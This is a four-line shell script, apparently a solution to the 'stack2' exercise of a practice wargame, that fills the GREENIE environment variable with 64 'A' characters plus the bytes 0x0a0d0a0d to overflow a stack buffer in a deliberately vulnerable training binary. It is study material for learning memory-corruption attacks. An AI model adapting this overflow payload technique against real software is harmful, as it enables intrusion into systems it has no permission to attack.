#! /bin/sh
GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'")
export GREENIE
./stack2

